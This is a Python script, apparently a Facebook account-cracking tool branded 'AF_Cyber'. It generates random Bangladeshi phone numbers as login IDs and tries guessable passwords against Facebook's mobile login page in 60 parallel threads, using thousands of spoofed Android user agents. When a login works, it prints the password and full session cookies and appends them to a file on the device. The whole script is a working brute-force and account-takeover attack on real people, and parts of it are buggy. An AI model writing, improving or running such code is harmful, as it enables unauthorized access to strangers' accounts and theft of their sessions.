import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = """
\33[0;91m$$$$$$\   $$$$$$\  $$$$$$\ $$$$$$$$\       
\33[0;91m$$  __$$\ $$  __$$\ \_$$  _|$$  _____|      
\33[0;91m$$ /  $$ |$$ /  \__|  $$ |  $$ |            
\33[0;91m$$$$$$$$ |\$$$$$$\    $$ |  $$$$$\          
\33[0;91m$$  __$$ | \____$$\   $$ |  $$  __|         
\33[0;91m$$ |  $$ |$$\   $$ |  $$ |  $$ |            
\33[0;91m$$ |  $$ |\$$$$$$  |$$$$$$\ $$ |            
\33[0;91m\__|  \__| \______/ \______|\__|"""
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ugen=[]
for ua in range(10000):
     a='Mozilla/5.0 (Linux; Android'
     b=random.choice(['5' , '6' , '7' , '8' , '9' , '10' , '11' , '12' , '13' , '14' , '15' , '16'])
     c='Redmi Note 7S Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     d='random.randrange(40,100)'
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
     h='Mobile Safari/537.36'
     ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
     ugen.append(ug)

for ua in range(10000):
     a='Mozilla/5.0 (Linux; Android'
     b=random.choice(['5' , '6' , '7' , '8' , '9' , '10' , '11' , '12' , '13' , '14' , '15' , '16'])
     c='SAMSUNG SM-S911U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/'
     d='random.randrange(40,100)'
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
     h='Mobile Safari/537.36'
     ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
     ugen.append(ug)

for ua in range(10000):
     a='Mozilla/5.0 (Linux; Android'
     b=random.choice(['5' , '6' , '7' , '8' , '9' , '10' , '11' , '12' , '13' , '14' , '15' , '16'])
     c='SM-S911U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     d='random.randrange(40,100)'
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
     h='Mobile Safari/537.36'
     ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
     ugen.append(ug)

for ua in range(10000):
     a='Mozilla/5.0 (Linux; Android'
     b=random.choice(['5' , '6' , '7' , '8' , '9' , '10' , '11' , '12' , '13' , '14' , '15' , '16'])
     c='SM-N976U Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     d='random.randrange(40,100)'
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
     h='Mobile Safari/537.36'
     ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
     ugen.append(ug)
     
def Main():
	os.system('clear')
	print(logo)
	print("<> BD SIM CODE : [017 018 019 013 015 016] ")
	love = input('<> SELECT : ')
	print('<> EXAMPLE : [1000,5000,10000,15000,20000] ')
	limit = int(input('<> LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as turag:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('<> CHOICE CODE : '+love)
		print('<> TOTAL ID   :  '+tl)
		print('<> CRACK STARTED....... ')
		print(50*'━')
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			turag.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' <> CRACK DONE......... ')
	print(50*'━')
	exit()
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mAF_Cyber\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\33[0;91m[\33[0;91mAF_Cyber-OK 😝\33[0;91m]\33[0;91m {uid}\33[0;91m|\33[0;91m {ps} ")
                print(f"\33[0;91m[😜] COOKIE :\33[0;91m {coki}")
                open('/sdcard/AF_Cyber-OK.txt', 'a').write(f'{uid} | {ps}\n {coki} \n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}AF_Cyber {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

Main()